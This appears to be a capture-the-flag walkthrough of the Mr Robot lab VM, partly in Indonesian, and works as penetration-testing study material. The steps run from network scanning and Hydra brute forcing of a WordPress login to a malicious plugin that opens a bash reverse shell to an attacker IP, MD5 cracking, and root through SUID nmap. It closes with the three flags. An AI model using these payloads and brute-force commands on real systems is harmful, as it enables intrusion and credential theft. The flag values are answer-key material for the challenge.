## NMAP Scan
```sh
sudo nmap -sP -PO 192.168.43.0-255
```

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-08 06:13 +08
Nmap scan report for 192.168.43.1
Host is up (0.0063s latency).
MAC Address: 3A:2A:D7:35:26:41 (Unknown)
Nmap scan report for linux (192.168.43.60)
Host is up (0.00011s latency).
MAC Address: 08:00:27:E9:6A:69 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.43.169
Host is up.
Nmap scan report for DimasWiki (192.168.43.171)
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 3.48 seconds
```

## Robots.txt
http://$victimIP/robots.txt
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

## Brute force with ffuf
```sh
wc -l fsocity.dic 
sort fsocity.dic | uniq > fsocity.dic.re
```

```sh
fsociety ffuf -w fsocity.dic.re -u http://192.168.43.60/FUZZ 
```

```
  
       /'___\  /'___\           /'___\          
      /\ \__/ /\ \__/  __  __  /\ \__/          
      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\         
       \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/         
        \ \_\   \ \_\  \ \____/  \ \_\          
         \/_/    \/_/   \/___/    \/_/          
  
      v1.4.1  
________________________________________________  
  
:: Method           : GET  
:: URL              : http://192.168.43.60/FUZZ  
:: Wordlist         : FUZZ: fsocity.dic  
:: Follow redirects : false  
:: Calibration      : false  
:: Timeout          : 10  
:: Threads          : 40  
:: Matcher          : Response status: 200,204,301,302,307,401,403,405,500  
________________________________________________  
  
images                  [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 37ms]  
css                     [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 0ms]  
image                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 1033ms]  
license                 [Status: 200, Size: 19930, Words: 3334, Lines: 386, Duration: 5ms]  
video                   [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 0ms]  
feed                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 1052ms]  
audio                   [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 0ms]  
admin                   [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 0ms]  
blog                    [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 0ms]  
Image                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 1117ms]  
intro                   [Status: 200, Size: 516314, Words: 2076, Lines: 2028, Duration: 3ms]  
rss                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 2245ms]  
login                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1797ms]  
readme                  [Status: 200, Size: 7334, Words: 759, Lines: 98, Duration: 4ms]  
Year2011201020092008200720062005200420032002200120001999199819971996199519941993199219911990198919881987198619851984198319821981198019791978197719761975197419731972197  
11970196919681967196619651964196319621961196019591958195719561955195419531952195119501949194819471946194519441943194219411940193919381937193619351934193319321931193019  
291928192719261925192419231922192119201919191819171916191519141913191219111910190919081907190619051904190319021901 [Status: 403, Size: 657, Words: 16, Lines: 10, Durat  
ion: 1ms]
```

### Username brute force
```sh
hydra -L fsocity.dic.re -p test  192.168.43.60 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
```

```
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, t  
hese *** ignore laws and ethics anyway).  
  
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-05-08 07:45:15  
[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:11452/p:1), ~716 tries per task  
[DATA] attacking http-post-form://192.168.43.60:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username  
[STATUS] 1728.00 tries/min, 1728 tries in 00:01h, 9724 to do in 00:06h, 16 active  
[STATUS] 1787.67 tries/min, 5363 tries in 00:03h, 6089 to do in 00:04h, 16 active  
[80][http-post-form] host: 192.168.43.60   login: Elliot   password: test  
[80][http-post-form] host: 192.168.43.60   login: elliot   password: test  
[80][http-post-form] host: 192.168.43.60   login: ELLIOT   password: test  
1 of 1 target successfully completed, 3 valid passwords found  
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-05-08 07:51:41
```

## Password brute force
```sh
hydra -l "elliot" -P fsocity.dic.re  192.168.43.60 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect.' 
```

```
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-05-08 07:57:48
[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:1/p:11452), ~716 tries per task
[DATA] attacking http-post-form://192.168.43.60:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect.
[STATUS] 1638.00 tries/min, 1638 tries in 00:01h, 9814 to do in 00:06h, 16 active
[STATUS] 1639.67 tries/min, 4919 tries in 00:03h, 6533 to do in 00:04h, 16 active
[80][http-post-form] host: 192.168.43.60   login: elliot   password: ER28-0652
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-05-08 08:01:19
```

## Exploitation using plugin upload in WP

```sh
`<?php`

`/**`  
`* Plugin Name: Reverse Shell Plugin`  
`* Plugin URI:`  
`* Description: Reverse Shell Plugin`  
`* Version: 1.0`  
`* Author: Vince Matteo`  
`* Author URI: http://www.sevenlayers.com`  
`*/`

`exec("/bin/bash -c 'bash -i >& /dev/tcp/$yourIP/$Port 0>&1'");`  
`?>`
```
### Open listen port and upload the file
http://192.168.43.60/wp-admin/plugin-install.php?tab=upload
upload: php-reverse-shell.php

### md5 crack
```
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```
pergi ke website ini https://www.dcode.fr/md5-hash untuk men-decrypt md5 hash dengan database yang mereka punya.
```
password: abcdefghijklmnopqrstuvwxyz
```

### Spawn tty
```
python -c 'import pty; pty.spawn("/bin/sh")'
```
Ini berguna agar terminal kita terhubung dengan stdin.
fungsinya agar kita bisa menggunakan peritah "su".

### Change to user robot
```sh
su robot
password: abcdefghijklmnopqrstuvwxyz
```

## Privilage Excalation
```sh
find / -perm -4000 -type f 2>/dev/null
```

```
/bin/ping  
/bin/umount  
/bin/mount  
/bin/ping6  
/bin/su  
/usr/bin/passwd  
/usr/bin/newgrp  
/usr/bin/chsh  
/usr/bin/chfn  
/usr/bin/gpasswd  
/usr/bin/sudo  
/usr/local/bin/nmap  
/usr/lib/openssh/ssh-keysign  
/usr/lib/eject/dmcrypt-get-device  
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper  
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper  
/usr/lib/pt_chown
```

```sh
ls -l /usr/local/bin/nmap
```

```
-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
```

```
nmap --interactive
```

```
!/bin/sh
```
## key/flag
key 1: 073403c8a58a1f80d943455fb30724b9
key 2: 822c73956184f694993bede3eb39f959
key 3: 04787ddef27c3dee1ee161b21670b4e4